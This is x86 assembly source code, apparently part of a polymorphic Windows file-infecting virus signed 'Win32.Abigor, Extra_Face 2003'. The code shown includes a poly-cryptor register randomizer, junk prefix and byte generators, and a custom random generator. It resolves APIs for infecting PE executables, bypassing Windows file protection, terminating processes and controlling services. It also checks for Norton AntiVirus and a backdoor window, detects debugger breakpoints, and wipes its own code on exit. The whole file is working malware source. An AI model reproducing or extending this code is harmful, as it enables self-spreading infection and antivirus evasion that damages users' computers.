;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  



GetRegs proc                                ; Determines regs affectation in poly cryptor loop
        push   edx
        push   ebx
        push   esi
        
        push   3
        pop    esi

    GetRegsLp:
       @@:
        xor    eax,eax
        push   7
        pop    ecx
        Call   Get_rand_range



        mov    edx,eax
                
       @@:
        xor    eax,eax
        push   7
        pop    ecx
        Call   Get_rand_range


        cmp    eax,edx
        jz     @B
        
        mov    ebx,eax

        
        mov    al, byte ptr [ebp + edx + base_reg]          
        xchg   al, byte ptr [ebp + ebx + base_reg]  
        mov    byte ptr [ebp + edx + base_reg],al

        dec    esi
        jns    GetRegsLp


        pop    esi
        pop    ebx
        pop    edx                   
        ret
GetRegs endp

;GetValid8BREGS proc
;        lea   eax, dword ptr [ebp + base_reg]
;        
;        ret
;GetValid8BREGS endp

ArrangeTo8Bits? proc
         push   ecx
         Call   Random32
         and    eax,0Fh
         jnz    @F
         push   -80h
         pop    eax
         push   80h
         pop    ecx
         Call   Get_rand_range
         mov    ebx,eax
        @@:
         pop    ecx
         ret
ArrangeTo8Bits? endp

OneByte db 0FCh
        db 0FDh
        db 0F5h
        db 0F8h
        db 0F9h
      
OneSize           = $ - OFFSET OneByte

Rand_OneByte proc

        Call   Random32
        and    eax, 07FFh
        jnz    @F


        push   ecx
        lea    eax, dword ptr [ebp + OneByte]
        mov    ecx, eax
        add    ecx, OneSize
        Call   Get_rand_range
        mov    al, byte ptr [eax]
        stosb
        pop    ecx
       @@:
        ret
Rand_OneByte endp
           
Prefix_Tbl db 0F2H
           db 0F3h
           db 0F2H
           db 0F3h
           db 0F2H
           db 0F3h
           db 0F2H
           db 0F3h
           db 0F2H
           db 0F3h
           db 0F2H
           db 0F3h
           db 2EH
           db 3EH
           db 26H
           db 64H
           db 65H
           db 2EH
           db 3EH
Prefix_TBL_size = $ - OFFSET Prefix_Tbl



Rand_Prefix proc uses ecx


        xor    eax, eax
        push   35
        pop    ecx
        Call   Get_rand_range
        dec    eax
        jnz    SkipPrefix

        push   ecx
        lea    eax, dword ptr [ebp + Prefix_Tbl]
        mov    ecx, eax
        add    ecx, Prefix_TBL_size
        Call   Get_rand_range
        mov    al, byte ptr [eax]
        stosb
        pop    ecx

       SkipPrefix:
        ret
Rand_Prefix endp

Get_rand_range proc         ; eax: min, ecx : max
       push edx
       push ebx

       
       mov  ebx,eax
       sub  ecx,eax
       mov  eax,ecx


       Call Random32
       xor  edx,edx
       jecxz @F
       div  ecx
      @@:
       add   edx,ebx
       mov  eax,edx

       pop  ebx
       pop  edx
       ret
Get_rand_range endp


Random_init proc

        lea   eax, dword ptr [ebp + szGetTickCount]
        Call  K32Api
        sub   dword ptr [ebp + SEED1], eax
        lea   eax, dword ptr [ebp + CreationTime]
        push  eax
        lea   eax, dword ptr [ebp + szGetSystemTimeAsFileTime]
        Call  K32Api
        mov   eax, dword ptr [ebp + CreationTime]
        add   dword ptr [ebp + SEED2], eax

        ret
Random_init endp

Random32 Proc uses ecx ebx edx

         mov  ebx, dword ptr [ebp + SEED1]
         rdtsc
         mov  ecx, eax
         and  ecx, 0F0Fh
         mov  eax, dword ptr [ebp + SEED2]
         bswap ebx
         ror  ebx, 3
         xor  ebx, 0B56AF12h
         rcl  ebx, cl
         adc  ebx, 15448Ch
         ror  ebx, 3
         xor  ebx, dword ptr [ebp + SEED1]
         add  eax, 124154144
         xor  dword ptr [ebp + SEED1], eax
         mov  cl, ch
         rcl  eax, cl
         adc  dword ptr [ebp + SEED1], ebx
         xor  dword ptr [ebp + SEED2], ebx
         xor  eax, ebx

         ret

         SEED1 dd 0
         SEED2 dd 0

Random32 endp


   

    _KERNEL32        dd  77E40000h  ; kernel XP
    

    szGetProcAddress db "GetProcAddress",0
    GPASIZE          equ OFFSET $ - OFFSET szGetProcAddress
    _GetProcAddress  dd  0bff76dach   ; default GPA (hardcoded win98)
    

;shitty db "FUCK.VXD",0

    ;UPXSign       db "UPX",0
    ;UPXSignLen    equ $ - OFFSET UPXSign
    
    ZipSign       db "_winzip_"
    ZipSignLen    equ $ - OFFSET ZipSign
  

    Kernel              db "kernel32.dll",0

    
K32APIZ:
    szLoadLibraryA                  db "LoadLibraryA",0
    szFreeLibrary                   db "FreeLibrary",0
    szUnmapViewOfFile               db "UnmapViewOfFile",0
    szCreateFileMappingA            db "CreateFileMappingA",0
    szCreateFileA                   db "CreateFileA",0
    szMapViewOfFile                 db "MapViewOfFile",0
    szGetFileSize                   db "GetFileSize",0
    szCloseHandle                   db "CloseHandle",0
    szSetFilePointer                db "SetFilePointer",0    
    szSetEndOfFile                  db "SetEndOfFile",0
    szFindFirstFileA                db "FindFirstFileA",0
    szFindNextFileA                 db "FindNextFileA",0
    szFindClose                     db "FindClose",0
    szVirtualAlloc                  db "VirtualAlloc",0
    szVirtualFree                   db "VirtualFree",0
    szGetTickCount                  db "GetTickCount",0
    szGetSystemTimeAsFileTime       db "GetSystemTimeAsFileTime",0
    szGetFileAttributesA            db "GetFileAttributesA",0
    szSetFileAttributesA            db "SetFileAttributesA",0
    szGetFileTime                   db "GetFileTime",0
    szSetFileTime                   db "SetFileTime",0
    szGetWindowsDirectoryA          db "GetWindowsDirectoryA",0
    szGetSystemDirectoryA           db "GetSystemDirectoryA",0
    szCopyFileA                     db "CopyFileA",0
    szGetVersionExA                 db "GetVersionExA",0
    szGetComputerNameA              db "GetComputerNameA",0
    szIsDebuggerPresent             db "IsDebuggerPresent",0
    szGetCommandLineA               db "GetCommandLineA",0
    szCreateProcessA                db "CreateProcessA",0
    szGetStartupInfoA               db "GetStartupInfoA",0
    szGetModuleFileNameA            db "GetModuleFileNameA",0
    szlstrcmpiA                     db "lstrcmpiA",0
    szMultiByteToWideChar           db "MultiByteToWideChar",0
    szOpenProcess                   db "OpenProcess",0
    szCreateToolhelp32Snapshot      db "CreateToolhelp32Snapshot",0
    szProcess32First                db "Process32First",0
    szProcess32Next                 db "Process32Next",0
    szTerminateProcess              db "TerminateProcess",0
    szGetTempPathA                  db "GetTempPathA",0
    szGetTempFileNameA              db "GetTempFileNameA",0
    szWriteFile                     db "WriteFile",0
    szSetErrorMode                  db "SetErrorMode",0
    szCreateThread                  db "CreateThread",0
    ;szGetCurrentThreadId            db "GetCurrentThreadId",0
    ;szSuspendThread                 db "SuspendThread",0
    ;szResumeThread                  db "ResumeThread",0
    ;szGetThreadContext              db "GetThreadContext",0
    ;szSetThreadContext              db "SetThreadContext",0
    szExitThread                    db "ExitThread",0
    szWaitForSingleObject           db "WaitForSingleObject",0
    szCreateEventA                   db "CreateEventA",0
    szSetEvent                      db "SetEvent",0
    szDeleteFileA                   db "DeleteFileA",0


    USER32                          db "USER32",0
    szFindWindowA                   db "FindWindowA",0
    szSendMessageA                  db "SendMessageA",0
    
    Advapi32                        db "advapi32",0
    szRegCloseKey                   db "RegCloseKey",0
    szRegCreateKeyExA               db "RegCreateKeyExA",0
    szRegSetValueExA                db "RegSetValueExA",0
    szOpenSCManagerA                db "OpenSCManagerA",0
    szCloseServiceHandle            db "CloseServiceHandle",0
    szOpenServiceA                  db "OpenServiceA",0
    szControlService                db "ControlService",0
    szDeleteService                 db "DeleteService",0
    szGetUserNameA                  db "GetUserNameA",0
    
    Psapi                           db "psapi",0
    szEnumProcesses                 db "EnumProcesses",0
    szGetModuleFileNameExA          db "GetModuleFileNameExA",0
   
    SFC                             db "SFC",0
    szSfcIsFileProtected            db "SfcIsFileProtected",0

    IMAGEHLP                        db "IMAGEHLP",0
    szCheckSumMappedFile            db "CheckSumMappedFile",0

    Shell32                         db "Shell32",0
    szSHGetFileInfo                 db "SHGetFileInfo",0
    
    szExitProcess                   db "ExitProcess",0  
    
    msvcrt                          db "msvcrt",0    
    _exit                           db "_exit",0 ; Msvctr's C\C++ standard exit function   
    exit                            db "exit",0  ; ...
    ;divider                         dd 10000000

    NAV_Win                         db "Norton AntiVirus",0
    hNAVWnd                         dd  ?
    TS_Win                          db "TS_server",0        ; Tiny Sting backdoor
    
U32APIZ:
    szMessageBoxA                   db "MessageBoxA",0                                
    ;szMessageBeep                   db "MessageBeep",0


    ;pAlloc                  dd      0


    hFind                   dd      0   
    ApiCounter              dd      0
    _USER32                 dd      0
    _ADVAPI32               dd      0
    _PSAPI                  dd      0
    _Shell32                dd      0
    _Exit1                  dd      0
    _Exit2                  dd      0
    _Exit3                  dd      0


    
    ThunkIndex              dd      0
    ;ImportSec               dd      0 
    hFile                   dd      0
    hMap                    dd      0
    pMap                    dd      0
    Size2Align              dd      0
    ;CryptBuf                dd      0

    FAlignment              dd      0
    ImageBase               dd      0
    ;EntryPoint              dd      0
    PEheader                dd      0
    OriginalAttributes      dd      0
    OriginalFileTime        dd      0
    ;SectionAlignment        dd      0
    
    InfectionTime           FILETIME <0>
    CreationTime            FILETIME <0>
    LastAccessTime          FILETIME <0>
    LastWriteTime           FILETIME <0>
    TimeDifference          FILETIME <0>

    ;ExitCode                dd          0
    pFileName               dd          0   
    SecHeader               dd          0
    HostBase                dd          0
    Patched?                dd          0
    SizeRelative            dd          0      
    hSFC                    dd          0
    pAlloc                  dd          0
    OldSize                 dd          0 
    ;hSnapShot               dd          0
    OldCompName             db          (MAX_COMPUTERNAME_LENGTH + 1) dup (0)
    InfectionCtr            db          0 
    _SizeTestFailed         db          0
    NewSystem               db          0
    


K32Api proc     
                                                 
      push   eax
      push   dword ptr [ebp+_KERNEL32]      
      Call   dword ptr [ebp+_GetProcAddress] 
      Call   StealthCode
      jmp    eax

K32Api endp      

      
U32Api proc   
                                  
      push   eax
      push   dword ptr [ebp+_USER32]
      Call   dword ptr [ebp+_GetProcAddress] 
      Call   StealthCode
      jmp    eax

U32Api endp

ADVAPI32Api proc

      push   eax
      push   dword ptr [ebp+_ADVAPI32]
      Call   dword ptr [ebp+_GetProcAddress] 
      Call   StealthCode
      jmp    eax
      
ADVAPI32Api endp

PSAPIApi    proc

      push   eax
      push   dword ptr [ebp+_PSAPI]
      Call   dword ptr [ebp+_GetProcAddress]
      Call   StealthCode
      jmp    eax
       
PSAPIApi    endp




StealthCode proc

      mov    ecx, dword ptr [esp+4]
      cmp    byte ptr [ecx], 0CCh           ; BPX check : Virus code return address
      jz     ZeroShit
      cmp    byte ptr [eax], 0CCh           ; BPX check : Api entrypoint
      jz     ZeroShit
      ret
StealthCode endp



ZeroShit:



        exception_handler:
            xor     edx,edx    
            pop     dword ptr fs:[edx]

        ;mov esp, [esp + 8]

        db 0BDh
@@Delta dd 0            ; Restore Delta
        
        
            .IF    byte ptr [ebp + _MainHostFile] == 1
                 @@:
                    Call    ReDoMainHost          
                    cmp  byte ptr [ebp + _MainHostFile], 1
                    jz   @B                   
            .ENDIF   
     

            
            lea    eax,dword ptr [ebp+msvcrt]
            push   eax
            lea    eax,dword ptr [ebp+szLoadLibraryA]
            CAll   K32Api

            lea    ecx,dword ptr [ebp+exit]
            push   ecx           
            push   eax
            lea    eax,dword ptr [ebp+szGetProcAddress]
            CAll   K32Api            

            
            mov    ebx, eax
           TheEnd:
            xor    eax, eax
            push   0                                   ; ExitCode
            mov    ecx, ZeroShitSize / 4
            lea    edi, [ebp + VirusStart]
ZeroShitSize       equ     ($ - OFFSET VirusStart) 
            rep    stosd
            Call   ebx
            ret
            db "Win32.Abigor, Extra_Face 2003 (c)",0

EndVir:
    VirusSize       equ     OFFSET  EndVir - OFFSET VirusStart 
    CryptSize       equ     OFFSET  EndVir - OFFSET VirusStart
    MAX_POLY_SIZE   equ     VirusSize + MAX_DEC_SIZE
    MAX_DEC_SIZE    equ     120000                                  ; Big MEM
    MAX_POLY_RECURSIVITY_SIZE equ MAX_DEC_SIZE / 2
    MAX_BRANCH_CODE_SIZE equ     30000                              ; for branch structures
    MINIMUM_FILE_SIZE equ   8000     
    MAXIMUM_FILE_SIZE equ   4000000           
    TIME_DROP       equ     0FFFFFFE0h       ;FFFFFD00 ~= 3,5 jours             

end start



